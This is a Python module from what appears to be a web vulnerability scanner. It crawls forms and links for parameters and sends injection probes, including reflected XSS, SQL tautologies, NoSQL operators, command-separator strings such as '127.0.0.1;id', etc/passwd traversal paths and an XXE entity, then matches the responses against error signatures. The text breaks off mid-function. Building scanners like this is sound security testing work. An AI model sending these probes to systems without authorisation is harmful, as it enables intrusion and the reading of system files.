from __future__ import annotations
import contextvars
import time
import html
import json
import re
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlsplit, urlunparse
from security_checks.finding_builder import build_injection_rule_finding
from security_checks.http_context import HttpContext
MIN_REFLECT_LENGTH = 4
XSS_MARKER = "WEBSETXSS123"
SQL_PROBE = "'"
SQL_TAUTOLOGY = "' OR '1'='1'--"
SQL_COMMENT = "';--"
NOSQL_QUERY = "[$ne]="
MAX_PROBES = 80
_PROBE_STATE: contextvars.ContextVar = contextvars.ContextVar(
    "webset_injection_probe_state",
    default=None,
)
_MAX_WIDE_TRIES = 3
_PROBE_TIMEOUT = 3.0
_INJECT_BUDGET_SEC = 20.0


def reset_origin_wide_probes() -> None:
    _PROBE_STATE.set({"wide": {}, "dom": set()})


def end_origin_wide_probes() -> None:
    _PROBE_STATE.set(None)


def _probe_state() -> dict | None:
    return _PROBE_STATE.get()
_CMD_PARAM_RE = re.compile(
    r"^(ip|host|hostname|cmd|command|exec|ping|target|addr|ipaddress)$",
    re.I,
)
_CMD_PROBES = (
    "127.0.0.1;id",
    "127.0.0.1|id",
    "127.0.0.1 && id",
    ";id",
    "|id",
    "&& id",
)
_CMD_HITS = (
    "uid=",
    "gid=",
    "groups=",
    "euid=",
    "volume in drive",
    "directory of ",
)
_FORM_BLOCK_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
_ATTR_METHOD_RE = re.compile(r"\bmethod\s*=\s*['\"]?([a-z]+)", re.I)
_ATTR_ACTION_RE = re.compile(r"\baction\s*=\s*['\"]([^'\"]*)['\"]", re.I)
_REDIRECT_PARAM_RE = re.compile(
    r"^(url|redirect|next|return|returnurl|dest|destination|redir|goto|continue)$",
    re.I,
)
_REDIRECT_MARK = "https://webset.invalid/probe"
SQL_ERROR_SIGNATURES = {
    "MySQL": (
        "you have an error in your sql syntax",
        "warning: mysqli_",
        "warning: mysql_",
        "mysqli_sql_exception",
        "er_parse_error",
        "check the manual that corresponds to your mysql server version",
    ),
    "PostgreSQL": (
        "pg_query():",
        "pg_exec():",
        "postgresql query failed",
        "unterminated quoted string at or near",
        "syntax error at or near",
    ),
    "Microsoft SQL Server": (
        "unclosed quotation mark after the character string",
        "microsoft ole db provider for sql server",
        "incorrect syntax near",
        "system.data.sqlclient.sqlexception",
    ),
    "Oracle": (
        "ora-00933",
        "ora-00921",
        "ora-01756",
        "quoted string not properly terminated",
        "oracle error",
    ),
    "SQLite": (
        "sqlite3::",
        "sqlite_error",
        "sqlite3.operationalerror",
        "unrecognized token:",
        "seqlite",
    ),
    "ORM / Generic": (
        "sqlstate[",
        "sql syntax error",
        "odbc driver error",
        "sequelizedatabaseerror",
        "dialects/sqlite",
        "sqlite/query",
    ),
}
VERBOSE_ERROR_SIGNATURES = (
    "traceback (most recent call last)",
    "stack trace",
    "at object.",
    "referenceerror",
    "typeerror:",
    "syntaxerror:",
    "enoent",
    "cannot find module",
    "sequelizedatabaseerror",
    "system.nullreferenceexception",
    "java.lang.",
    "whitelabel error page",
)
_SCRIPT_OPEN = re.compile(r"<\s*script\b[^>]*>", re.IGNORECASE)
_SCRIPT_CLOSE = re.compile(r"<\s*/\s*script\s*>", re.IGNORECASE)
_SCRIPT_SRC_RE = re.compile(r"""<script[^>]+src=['"]([^'"]+)['"]""", re.I)
_MODULEPRELOAD_RE = re.compile(
    r"""<link[^>]+rel=['"](?:modulepreload|preload)['"][^>]+href=['"]([^'"]+\.m?js)['"]""",
    re.I,
)
_HREF_RE = re.compile(r"""(?:href|src|action)\s*=\s*['"]([^'"]+)['"]""", re.I)
_QUERY_URL_RE = re.compile(
    r"""['"]((?:https?:)?//[^'"]+\?[^'"]+|/[A-Za-z0-9_./-]*\?[A-Za-z0-9_.=&%-]+)['"]""",
    re.I,
)
_HASH_ROUTE_RE = re.compile(
    r"""#(/[A-Za-z0-9][A-Za-z0-9_./\-]*(?:\?[A-Za-z0-9_\-.=&%]*)?)""",
)
_AUTH_PATH_RE = re.compile(
    r"""['"`]((?:https?:)?//[^'"`\s]+|/(?:rest|api|v\d+)?/?[A-Za-z0-9_./-]*(?:login|signin|authenticate|session)[A-Za-z0-9_./-]*)['"`]""",
    re.I,
)
_INPUT_NAME_RE = re.compile(
    r"""<(?:input|select|textarea)\b[^>]*\bname\s*=\s*['"]([^'"]+)['"]""",
    re.I,
)
_FILE_PARAM_RE = re.compile(
    r"^(file|filename|filepath|path|doc|document|template|page|include|dir)$",
    re.I,
)
_SEARCH_PARAM_RE = re.compile(r"^(q|query|search|s|keyword|term)$", re.I)
_ID_PARAM_RE = re.compile(r"^(id|item|product|user|uid|userid)$", re.I)
_SUBMIT_KEY_RE = re.compile(r"submit", re.I)
_AUTH_IDENTITY_RE = re.compile(
    r"^(user(name)?|login|email|e[_-]?mail|user[_-]?id|uid|account|identifier)$",
    re.I,
)
_AUTH_SECRET_RE = re.compile(
    r"^(pass(word|wd)?|passwd|pwd|passcode)$",
    re.I,
)
_AUTH_JSON_KEYS = (
    "token",
    "authentication",
    "access_token",
    "accessToken",
    "refresh_token",
    "jwt",
    "id_token",
)
_GENERIC_AUTH_PATHS = (
    "/login",
    "/signin",
    "/session",
    "/auth",
    "/auth/login",
    "/api/login",
    "/api/auth",
    "/api/auth/login",
    "/api/signin",
    "/api/session",
    "/api/users/login",
    "/api/v1/login",
    "/user/login",
    "/users/login",
    "/account/login",
    "/rest/login",
    "/rest/user/login",
    "/rest/users/login",
    "/rest/auth/login",
)
_TRAVERSAL_PROBES = (
    "../" * 8 + "etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
)
_TRAVERSAL_HITS = (
    "root:x:",
    "root:*:",
    "[boot loader]",
    "for 16-bit app support",
)
_XXE_BODY = (
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)
_XXE_PATHS = (
    "/import",
    "/upload",
    "/api/import",
    "/api/upload",
    "/file-upload",
    "/fileupload",
    "/xml",
    "/api/xml",
    "/parse",
    "/soap",
    "/api/parse",
)
_XXE_PARSE_HINTS = (
    "entity",
    "doctype",
    "external entity",
    "xmlparse",
    "xml parser",
    "dtd",
    "file://",
)
def _canon_host(host: str) -> str:
    name = (host or "").lower()
    if name == "localhost":
        return "127.0.0.1"
    return name
_INDEX_DOCS = frozenset({
    "index.php", "index.html", "index.htm", "index.asp",
    "index.aspx", "default.aspx", "index.jsp",
})
def _absolute_url(url: str, base: str = "") -> str:
    raw = str(url or "").strip()
    if not raw:
        return str(base or "").strip()
    if "://" in raw:
        return raw
    if base:
        return urljoin(base, raw)
    return raw
def _sink_url(url: str, base: str = "") -> str:
    """Finding location = scheme+host+path. Probe query strings are not the sink."""
    raw = _absolute_url(url, base)
    if not raw:
        return ""
    if "://" not in raw:
        raw = "http://" + raw
    p = urlparse(raw)
    path = p.path or "/"
    return urlunparse((p.scheme, p.netloc, path, "", "", ""))
def _page_key(url: str, base: str = "") -> tuple[str, str]:
    raw = _absolute_url(url, base)
    if not raw:
        return "", ""
    if "://" not in raw:
        raw = "http://" + raw
    try:
        p = urlparse(raw)
    except Exception:
        return "", ""
    host = _canon_host(p.hostname or "")
    path = p.path or "/"
    if not path.startswith("/"):
        path = "/" + path
    last = path.rsplit("/", 1)[-1].lower()
    if last in _INDEX_DOCS:
        path = path[: path.rfind("/")] or "/"
    if path != "/" and path.endswith("/"):
        path = path.rstrip("/")
    return host, path or "/"
def _belongs_to_page(param: dict, page_url: str) -> bool:
    """True when the param URL is this page. Used only for the passive SQL pass."""
    target = str((param or {}).get("url") or "").strip()
    if not target or not page_url:
        return True
    return _page_key(target, page_url) == _page_key(page_url)
def _prefer_ipv4(url: str) -> str:
    parsed = urlparse(url or "")
    host = (parsed.hostname or "").lower()
    if host != "localhost":
        return url
    netloc = "127.0.0.1"
    if parsed.port:
        netloc = f"127.0.0.1:{parsed.port}"
    return urlunparse(
        (parsed.scheme, netloc, parsed.path, parsed.params, parsed.query, parsed.fragment)
    )
def params_from_url(url: str) -> list[dict]:
    parsed = urlparse(str(url or ""))
    if not parsed.query:
        return []
    base = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", ""))
    return [
        {
            "name": name,
            "value": value,
            "location": "query",
            "method": "GET",
            "url": base,
            "source": "url",
        }
        for name, value in parse_qsl(parsed.query, keep_blank_values=True)
        if name
    ]
def params_from_forms(forms) -> list[dict]:
    records: list[dict] = []
    for form in forms or []:
        if not isinstance(form, dict):
            continue
        method = str(form.get("method") or "GET").upper()
        form_url = str(form.get("url") or form.get("action") or "")
        default_loc = "body" if method == "POST" else "query"
        fields = (
            form.get("parameters")
            or form.get("inputs")
            or form.get("fields")
            or form.get("params")
            or []
        )
        parsed: list[tuple[str, str, str]] = []
        for field in fields:
            ftype = ""
            if isinstance(field, dict):
                name = field.get("name") or field.get("id")
                value = field.get("value") or ""
                location = field.get("location") or default_loc
                ftype = str(field.get("type") or "")
            elif isinstance(field, (list, tuple)) and field:
                name = field[0]
                value = field[1] if len(field) > 1 else ""
                location = field[2] if len(field) > 2 else default_loc
            else:
                name, value, location = field, "", default_loc
            if not str(name or "").strip():
                continue
            name = str(name)
            value = str(value or "")
            if not value and (
                "submit" in ftype.lower() or _SUBMIT_KEY_RE.search(name)
            ):
                value = "Submit"
            parsed.append((name, value, str(location or default_loc)))
        companions = {n: v for n, v, _ in parsed}
        for name, value, location in parsed:
            records.append({
                "name": name,
                "value": value,
                "location": location,
                "method": method,
                "url": form_url,
                "source": "form",
                "companions": {k: v for k, v in companions.items() if k != name},
            })
    return records
def _origin(url: str) -> str:
    raw = url if "://" in (url or "") else "http://" + (url or "")
    p = urlparse(raw)
    host = _canon_host(p.hostname or "")
    if not host:
        return ""
    netloc = host
    if p.port:
        netloc = f"{host}:{p.port}"
    return f"{p.scheme or 'http'}://{netloc}"
def _hash_to_http(fragment: str, origin: str) -> str:
    frag = str(fragment or "").strip()
    if frag.startswith("#"):
        frag = frag[1:]
    if not frag.startswith("/") or not origin:
        return ""
    if "?" in frag:
        path, query = frag.split("?", 1)
    else:
        path, query = frag, ""
    return origin + (path or "/") + (f"?{query}" if query else "")
def _abs_url(raw: str, origin: str) -> str:
    text = str(raw or "").strip()
    if not text or text.startswith(("mailto:", "javascript:", "data:")):
        return ""
    if text.startswith("#"):
        text = _hash_to_http(text, origin)
        if not text:
            return ""
    if text.startswith("//"):
        text = urlparse(origin).scheme + ":" + text
    elif text.startswith("/"):
        text = urljoin(origin + "/", text.lstrip("/"))
    elif "://" not in text:
        text = urljoin(origin + "/", text)
    parsed = urlparse(text)
    if not parsed.netloc:
        return ""
    if origin and _origin(text) != _origin(origin):
        return ""
    return text
def params_from_html_links(body: str, page_url: str) -> list[dict]:
    origin = _origin(page_url)
    if not origin:
        return []
    found: list[dict] = []
    seen = set()
    candidates = [m.group(1) for m in _HREF_RE.finditer(body or "")]
    candidates.extend(m.group(1) for m in _QUERY_URL_RE.finditer(body or ""))
    for raw in candidates:
        url = _abs_url(raw, origin)
        if not url or "?" not in url:
            continue
        for item in params_from_url(url):
            key = (item["url"], item["name"])
            if key in seen:
                continue
            seen.add(key)
            found.append(item)
    for raw in _HASH_ROUTE_RE.findall(body or ""):
        url = _hash_to_http(raw if str(raw).startswith("#") else "#" + str(raw), origin)
        if not url:
            continue
        items = params_from_url(url)
        if not items:
            base = url.split("?")[0]
            for name in ("id", "q", "query", "search"):
                items.append({
                    "name": name,
                    "value": "",
                    "location": "query",
                    "method": "GET",
                    "url": base,
                    "source": "url",
                })
        for item in items:
            key = (item["url"], item["name"])
            if key in seen:
                continue
            seen.add(key)
            found.append(item)
    return found
def _dedupe_params(params) -> list[dict]:
    seen: set[tuple] = set()
    out: list[dict] = []
    for p in params or []:
        name = str(p.get("name") or "").strip()
        if not name:
            continue
        key = (
            str(p.get("method") or "GET").upper(),
            str(p.get("url") or ""),
            name.lower(),
            str(p.get("location") or "query"),
        )
        if key in seen:
            continue
        seen.add(key)
        out.append(p)
    return out
def _attach_sibling_fields(params) -> list[dict]:
    """Carry hidden / submit fields from the same form URL with every probe.
    Many servers only execute the handler when the submit name is present
    (HTML successful-control). GET probes that omit it never hit the sink.
    """
    groups: dict[tuple, list[dict]] = {}
    for p in params or []:
        key = (
            str(p.get("method") or "GET").upper(),
            _sink_url(str(p.get("url") or "")),
        )
        groups.setdefault(key, []).append(p)
    for items in groups.values():
        bag: dict[str, str] = {}
        for p in items:
            n = str(p.get("name") or "").strip()
            if not n:
                continue
            val = str(p.get("value") or "")
            if not val and _SUBMIT_KEY_RE.search(n):
                val = "Submit"
            bag.setdefault(n, val)
            extra = p.get("companions")
            if isinstance(extra, dict):
                for k, v in extra.items():
                    kn = str(k or "").strip()
                    if kn and kn not in bag:
                        bag[kn] = "" if v is None else str(v)
        if not bag:
            continue
        for p in items:
            n = str(p.get("name") or "").strip()
            merged = dict(p.get("companions") or {})
            for k, v in bag.items():
                if k != n and k not in merged:
                    merged[k] = v
            p["companions"] = merged
    return params
def _merge_probe_fields(base: dict, param: dict, probe: str) -> dict:
    out = {str(k): ("" if v is None else str(v)) for k, v in (base or {}).items() if k}
    companions = param.get("companions")
    if isinstance(companions, dict):
        for k, v in companions.items():
            kn = str(k or "").strip()
            if kn and kn not in out:
                out[kn] = "" if v is None else str(v)
    name = str(param.get("name") or "").strip()
    if name:
        out[name] = probe
    if str(param.get("source") or "") == "form" or companions:
        if not any(_SUBMIT_KEY_RE.search(str(k)) for k in out):
            out.setdefault("Submit", "Submit")
    return out
def _param_priority(param: dict) -> int:
    name = str(param.get("name") or "")
    path = urlparse(str(param.get("url") or "")).path.lower()
    if any(tok in path for tok in ("search", "find", "query")):
        return -2
    if _SEARCH_PARAM_RE.match(name):
        return -1
    if _ID_PARAM_RE.match(name):
        return 0
    if _FILE_PARAM_RE.match(name):
        return 1
    if _CMD_PARAM_RE.match(name):
        return 2
    return 4
def _param_visible(param: dict, body: str, page_url: str = "") -> bool:
    # Off-page harvested / generic search params MUST still be probed.
    # Location is the param's own URL (sink), not the page that mentioned it.
    if str(param.get("source") or "") in ("form", "url", "search"):
        return True
    name = str(param.get("name") or "").strip().lower()
    if not name:
        return False
    url = str(param.get("url") or page_url or "")
    qnames = {
        key.lower()
        for key, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)
    }
    if name in qnames:
        return True
    blob = (body or "").lower()
    if f'name="{name}"' in blob or f"name='{name}'" in blob:
        return True
    path = urlparse(url).path.lower()
    if _SEARCH_PARAM_RE.match(name) and "search" in path:
        return True
    if _ID_PARAM_RE.match(name) and any(
        part in path for part in ("product", "item", "user", "id", "search", "track", "result", "order")
    ):
        return True
    return False
def _reflection_offsets(body: str, value: str) -> list[int]:
    offsets: list[int] = []
    start = 0
    while len(offsets) < 20:
        idx = body.find(value, start)
        if idx == -1:
            break
        offsets.append(idx)
        start = idx + 1
    return offsets
def _context_at(body: str, offset: int) -> str:
    before = body[:offset]
    if not before:
        return "html_body"
    if before.rfind("<") > before.rfind(">"):
        return "html_attribute"
    open_match = None
    for m in _SCRIPT_OPEN.finditer(before):
        open_match = m
    if open_match and not any(_SCRIPT_CLOSE.finditer(before, open_match.end())):
        return "script"
    low = (body or "").lstrip()
    if low.startswith("{") or low.startswith("["):
        return "json"
    return "html_body"
def _is_only_html_encoded(body: str, value: str) -> bool:
    escaped = html.escape(value, quote=True)
    if escaped == value:
        return False
    return escaped in body and value not in body
def _marker_reflected(body: str, value: str) -> bool:
    if not body or not value:
        return False
    if value in body:
        return True
    return html.unescape(body).find(value) >= 0
def _rule_finding(*args, **kwargs):
    try:
        return build_injection_rule_finding(*args, **kwargs)
    except Exception as exc:
        print("injection_checks finding:", exc)
        return None
def _reflection_outside_warning(body: str, value: str) -> bool:
    """Ignore a marker that only appears inside a PHP include warning."""
    if not body or not value or value not in body:
        return False
    for line in body.splitlines():
        if value not in line:
            continue
        if re.search(r"warning\s*:|failed opening|failed to open stream", line, re.I):
            continue
        return True
    return False


def check_reflected_input(ctx: HttpContext, params) -> list[dict]:
    body = ctx.body or ""
    if not body:
        return []
    findings: list[dict] = []
    for param in _dedupe_params(params):
        name = str(param.get("name") or "").strip()
        value = str(param.get("value") or "")
        if not name or len(value) < MIN_REFLECT_LENGTH:
            continue
        if _is_only_html_encoded(body, value):
            continue
        if not _marker_reflected(body, value) and not _marker_reflected(body, XSS_MARKER):
            continue
        reflected = value if value in body else XSS_MARKER
        if "<" in reflected and not _reflection_outside_warning(body, reflected):
            continue
        if "<" not in reflected and "<" not in reflected.lower():
            # A plain word echoed in the page is not an XSS sink.
            continue
        offsets = _reflection_offsets(body, value) or _reflection_offsets(body, XSS_MARKER)
        contexts = sorted({_context_at(body, off) for off in offsets}) if offsets else ["json"]
        item = _rule_finding(
            "xss-reflected",
            url=str(param.get("url") or ctx.url),
            param=name,
            vuln_type="xss",
            method=str(param.get("method") or "GET"),
            param_location=str(param.get("location") or "query"),
            context=contexts[0],
            evidence=(
                f"marker '{XSS_MARKER}' reflected in response "
                f"({', '.join(contexts)})"
            ),
        )
        if item:
            comps = param.get("companions")
            if isinstance(comps, dict) and comps:
                item["companions"] = {
                    str(k): "" if v is None else str(v)
                    for k, v in comps.items()
                    if str(k or "").strip()
                }
            findings.append(item)
    return findings
def find_sql_error_signature(body: str) -> tuple[str, str] | None:
    low = (body or "").lower()
    if re.search(
        r"(if you see the following|when running the setup script|"
        r"do not upload it to your hosting|for the web server and database|"
        r"source code of|view source)",
        low,
    ) and not re.search(
        r"(you have an error in your sql syntax|sqlstate\[|"
        r"unclosed quotation|unterminated quoted|mysqli_sql_exception|"
        r"sequelizedatabaseerror)",
        low,
    ):
        return None
    for engine, phrases in SQL_ERROR_SIGNATURES.items():
        for phrase in phrases:
            if phrase in low:
                return engine, phrase
    return None
def find_verbose_error(body: str) -> str | None:
    low = (body or "").lower()
    for phrase in VERBOSE_ERROR_SIGNATURES:
        if phrase in low:
            return phrase
    return None


def _companion_names(param: dict) -> set[str]:
    names: set[str] = set()
    extra = (param or {}).get("companions")
    if isinstance(extra, dict):
        for key in extra:
            n = str(key or "").strip().lower()
            if n:
                names.add(n)
    return names


def _is_auth_injection_param(param: dict) -> bool:
    """Login/auth surface on whatever host is being scanned.

    JSON identity/secret fields are auth by location. HTML forms are auth
    only when an identity field and a password field appear together — a
    lone ?user=1 is not a login form.
    """
    name = str((param or {}).get("name") or "").strip()
    if not name:
        return False
    loc = str((param or {}).get("location") or "").lower()
    if loc in ("json", "body_json"):
        return bool(_AUTH_IDENTITY_RE.match(name) or _AUTH_SECRET_RE.match(name))
    names = {name.lower()} | _companion_names(param)
    has_id = any(_AUTH_IDENTITY_RE.match(n) for n in names)
    has_secret = any(_AUTH_SECRET_RE.match(n) for n in names)
    if not (has_id and has_secret):
        return False
    return bool(_AUTH_IDENTITY_RE.match(name) or _AUTH_SECRET_RE.match(name))


def _sql_rule_id(param: dict) -> str:
    return "sqli-auth" if _is_auth_injection_param(param) else "sqli-error"


def check_sql_error_indicators(ctx: HttpContext, params, baseline_body: str | None = None) -> list[dict]:
    hit = find_sql_error_signature(ctx.body or "")
    if not hit:
        return []
    if baseline_body is not None:
        if find_sql_error_signature(baseline_body):
            return []
        _, phrase = hit
        if phrase and phrase in (baseline_body or "").lower():
            return []
    engine, phrase = hit
    page_url = str(ctx.requested_url or ctx.url or "")
    candidates = [
        p for p in _dedupe_params(params)
        if _param_visible(p, ctx.body or "")
    ]
    if not candidates:
        return []
    param = candidates[0]
    name = str(param.get("name") or "").strip()
    if not name:
        return []
    evidence = f"{engine} error signature in response: '{phrase}'"
    if ctx.status >= 500:
        evidence += f" (HTTP {ctx.status})"
    sink = _sink_url(str(param.get("url") or page_url))
    item = _rule_finding(
        _sql_rule_id(param),
        url=sink,
        param=name,
        vuln_type="sqli",
        method=str(param.get("method") or "GET"),
        param_location=str(param.get("location") or "query"),
        evidence=evidence,
    )
    return [item] if item else []
def check_verbose_error(ctx: HttpContext, params) -> list[dict]:
    phrase = find_verbose_error(ctx.body or "")
    if not phrase:
        return []
    if find_sql_error_signature(ctx.body or ""):
        return []
    candidates = _dedupe_params(params)
    param = candidates[0] if candidates else {}
    item = _rule_finding(
        "verbose-error",
        url=str(param.get("url") or ctx.url),
        param=str(param.get("name") or ""),
        vuln_type="generic",
        method=str(param.get("method") or "GET"),
        param_location=str(param.get("location") or "query"),
        evidence=f"implementation error detail in body: '{phrase}'",
    )
    return [item] if item else []
def _looks_artefact(value) -> bool:
    return isinstance(value, dict) and (
        "body" in value or "headers" in value or "ok" in value
    )
def _shared_cookies() -> list:
    out = []
    try:
        from core.shared_state import SharedState
        jar = getattr(SharedState, "scan_cookies", None) or {}
        if hasattr(jar, "items"):
            for name, value in jar.items():
                if name:
                    out.append({"name": str(name), "value": str(value)})
    except Exception:
        pass
    return out
def _cookies_from_ctx(ctx, artefact=None) -> list:
    bag = []
    if artefact and isinstance(artefact, dict):
        bag.extend(artefact.get("cookies") or artefact.get("set_cookie") or [])
    for attr in ("cookies", "set_cookie"):
        bag.extend(list(getattr(ctx, attr, None) or []))
    bag.extend(_shared_cookies())
    return bag
def _cookie_header(cookies) -> str:
    parts = []
    seen = set()
    for item in cookies or []:
        if not isinstance(item, dict):
            continue
        name = str(item.get("name") or "").strip()
        value = str(item.get("value") or "")
        if not name:
            raw = str(item.get("raw") or "")
            if "=" in raw:
                name, value = raw.split("=", 1)
        if not name or name in seen:
            continue
        seen.add(name)
        parts.append(f"{name}={value}")
    return "; ".join(parts)
def _send(method: str, url: str, body: str | None = None, content_type: str | None = None, cookies=None, files=None, extra_headers=None, timeout: float | None = None) -> dict:
    try:
        import requests
        headers = {"User-Agent": "WebSET-Scanner/1.0", "Connection": "close"}
        if content_type and not files:
            headers["Content-Type"] = content_type
        cookie_header = _cookie_header(cookies)
        if cookie_header:
            headers["Cookie"] = cookie_header
        if extra_headers:
            headers.update({str(k): str(v) for k, v in dict(extra_headers).items() if v})
        resp = requests.request(
            method=method,
            url=_prefer_ipv4(url),
            headers=headers,
            data=body,
            files=files,
            timeout=timeout if timeout is not None else _PROBE_TIMEOUT,
            allow_redirects=False,
        )
        try:
            text = resp.text
        except Exception:
            text = resp.content.decode("utf-8", errors="replace")
        return {
            "ok": True,
            "url": str(resp.url),
            "status": int(resp.status_code),
            "body": text,
            "headers": dict(resp.headers),
        }
    except Exception:
        return {"ok": False, "url": url, "status": 0, "body": "", "headers": {}}
def _apply_probe(param: dict, fallback_url: str, probe: str) -> tuple[str, str, str | None, str | None]:
    method = str(param.get("method") or "GET").upper()
    raw = _absolute_url(str(param.get("url") or fallback_url or ""), str(fallback_url or ""))
    if "://" not in raw:
        raw = "http://" + raw
    loc = str(param.get("location") or "query").lower()
    name = str(param.get("name") or "").strip()
    p = urlparse(raw)
    path = p.path or "/"
    if loc in ("query", "url", "get") or method == "GET":
        q = dict(parse_qsl(p.query, keep_blank_values=True))
        q = _merge_probe_fields(q, param, probe)
        url = urlunparse((p.scheme, p.netloc, path, "", urlencode(q), ""))
        return method, url, None, None
    if loc in ("json", "body_json"):
        url = urlunparse((p.scheme, p.netloc, path, "", "", ""))
        return method, url, json.dumps({name: probe}), "application/json"
    url = urlunparse((p.scheme, p.netloc, path, "", "", ""))
    payload = _merge_probe_fields({}, param, probe)
    if name.lower() != "submit" and not any(_SUBMIT_KEY_RE.search(str(k)) for k in payload):
        payload.setdefault("Submit", "Submit")
    return method, url, urlencode(payload), "application/x-www-form-urlencoded"
def _json_auth_success(status: int, body: str) -> bool:
    if int(status or 0) not in (200, 201):
        return False
    text = body or ""
    try:
        data = json.loads(text)
    except Exception:
        low = text.lower()
        return "authentication" in low and "token" in low
    if not isinstance(data, dict):
        return False
    blob = data.get("authentication") if isinstance(data.get("authentication"), dict) else data
    if not isinstance(blob, dict):
        blob = data
    return any(k in blob and blob.get(k) for k in _AUTH_JSON_KEYS)
def _boolean_sqli(param: dict, fallback: str, cookies=None) -> list[dict]:
    method, url_a, body_a, type_a = _apply_probe(param, fallback, "1")
    base = _send(method, url_a, body_a, type_a, cookies=cookies)
    method, url_b, body_b, type_b = _apply_probe(param, fallback, SQL_TAUTOLOGY)
    taut = _send(method, url_b, body_b, type_b, cookies=cookies)
    if not base.get("ok") or not taut.get("ok"):
        return []
    a = str(base.get("body") or "")
    b = str(taut.get("body") or "")
    if find_sql_error_signature(b):
        return []
    if int(taut.get("status") or 0) not in (200, 500):
        return []
    if abs(len(a) - len(b)) < 80:
        return []
    item = _rule_finding(
        _sql_rule_id(param),
        url=_sink_url(str(param.get("url") or fallback)),
        param=str(param.get("name") or ""),
        vuln_type="sqli",
        method=str(param.get("method") or "GET"),
        param_location=str(param.get("location") or "query"),
        evidence="boolean probe changed response length versus baseline",
    )
    return [item] if item else []
def _probe_param(ctx: HttpContext, param: dict, cookies=None, page_body: str = "") -> list[dict]:
    findings: list[dict] = []
    name = str(param.get("name") or "").strip()
    if not name:
        return findings
    page_url = ctx.requested_url or ctx.url
    if not _param_visible(param, page_body or ctx.body or ""):
        return findings
    fallback = param.get("url") or ctx.raw_url or ctx.url
    fallback = _absolute_url(str(fallback), page_url)
    sink = _sink_url(str(fallback), page_url)
    existing = str(param.get("value") or "").strip()
    if (
        not existing
        or existing in (XSS_MARKER, SQL_PROBE, SQL_COMMENT, SQL_TAUTOLOGY, "<WebSETXSS123>")
        or "'" in existing
        or existing.startswith((";", "|", "&", "<"))
        or len(existing) > 80
    ):
        existing = "1" if _ID_PARAM_RE.match(name) else "webset"
    if not (_SUBMIT_KEY_RE.search(name) or name.lower() in {"user_token", "csrftoken", "csrf"}):
        xss_probe = "<WebSETXSS123>"
        method, xss_url, xss_body, xss_type = _apply_probe(param, fallback, xss_probe)
        xss_resp = _send(method, xss_url, xss_body, xss_type, cookies=cookies)
        if xss_resp.get("ok") and xss_resp.get("body"):
            probe_ctx = HttpContext.from_fetch(xss_resp, requested_url=fallback)
            tagged = dict(param)
            tagged["value"] = xss_probe
            tagged["url"] = sink
            findings.extend(check_reflected_input(probe_ctx, [tagged]))
    sql_eligible = not (
        _FILE_PARAM_RE.match(name)
        or _CMD_PARAM_RE.match(name)
        or _REDIRECT_PARAM_RE.match(name)
        or _SUBMIT_KEY_RE.search(name)
    )
    sql_findings: list[dict] = []
    if sql_eligible:
        method, burl, bbody, btype = _apply_probe(param, fallback, existing)
        bresp = _send(method, burl, bbody, btype, cookies=cookies)
        baseline_text = str(bresp.get("body") or "") if bresp.get("ok") else ""
        sql_probes = (SQL_PROBE, SQL_COMMENT)
        if _ID_PARAM_RE.match(name) or _SEARCH_PARAM_RE.match(name):
            sql_probes = (SQL_PROBE, SQL_COMMENT, SQL_TAUTOLOGY)
        for probe in sql_probes:
            method, sql_url, sql_body, sql_type = _apply_probe(param, fallback, probe)
            sql_resp = _send(method, sql_url, sql_body, sql_type, cookies=cookies)
            if not sql_resp.get("ok"):
                continue
            probe_ctx = HttpContext.from_fetch(sql_resp, requested_url=fallback)
            tagged = dict(param)
            tagged["value"] = probe
            tagged["url"] = sink
            sql_findings.extend(
                check_sql_error_indicators(
                    probe_ctx, [tagged], baseline_body=baseline_text
                )
            )
            if sql_findings:
                break
        if not sql_findings and (_ID_PARAM_RE.match(name) or _SEARCH_PARAM_RE.match(name)):
            sql_findings.extend(_boolean_sqli(param, fallback, cookies=cookies))
    findings.extend(sql_findings)
    if _SEARCH_PARAM_RE.match(name) or _ID_PARAM_RE.match(name):
        method, nurl, nbody, ntype = _apply_probe(param, fallback, "$ne")
        nresp = _send(method, nurl, nbody, ntype, cookies=cookies)
        if nresp.get("ok"):
            low = str(nresp.get("body") or "").lower()
            if "$ne" not in low and any(
                tok in low for tok in ("mongodb", "mongoerror", "cast to", "operator")
            ):
                item = _rule_finding(
                    "nosqli",
                    url=str(param.get("url") or ctx.url),
                    param=name,
                    vuln_type="nosqli",
                    method=str(param.get("method") or "GET"),
                    param_location=str(param.get("location") or "query"),
                    evidence="document-operator probe changed backend error class",
                )
                if item:
                    findings.append(item)
    if _FILE_PARAM_RE.match(name):
        for trav in _TRAVERSAL_PROBES:
            method, turl, tbody, ttype = _apply_probe(param, fallback, trav)
            tresp = _send(method, turl, tbody, ttype, cookies=cookies)
            body = str(tresp.get("body") or "")
            if any(hit in body for hit in _TRAVERSAL_HITS):
                item = _rule_finding(
                    "path-traversal",
                    url=str(param.get("url") or ctx.url),
                    param=name,
                    vuln_type="path_traversal",
                    method=str(param.get("method") or "GET"),
                    param_location=str(param.get("location") or "query"),
                    evidence="traversal probe returned foreign file signature",
                )
                if item:
                    findings.append(item)
                break
    if _CMD_PARAM_RE.match(name):
        for probe in _CMD_PROBES:
            method, curl, cbody, ctype = _apply_probe(param, fallback, probe)
            cresp = _send(method, curl, cbody, ctype, cookies=cookies)
            body = str(cresp.get("body") or "")
            if any(hit in body for hit in _CMD_HITS):
                item = _rule_finding(
                    "cmd-injection",
                    url=str(param.get("url") or ctx.url),
                    param=name,
                    vuln_type="command_injection",
                    method=str(param.get("method") or "GET"),
                    param_location=str(param.get("location") or "query"),
                    evidence="command separator probe returned OS identity output",
                )
                if item:
                    findings.append(item)
                break
    if _REDIRECT_PARAM_RE.match(name):
        method, rurl, rbody, rtype = _apply_probe(param, fallback, _REDIRECT_MARK)
        rresp = _send(method, rurl, rbody, rtype, cookies=cookies)
        loc = ""
        headers = rresp.get("headers") or {}
        for key, val in headers.items():
            if str(key).lower() == "location":
                loc = str(val or "")
                break
        if "webset.invalid" in loc.lower() or "webset.invalid" in str(rresp.get("url") or "").lower():
            item = _rule_finding(
                "open-redirect",
                url=str(param.get("url") or ctx.url),
                param=name,
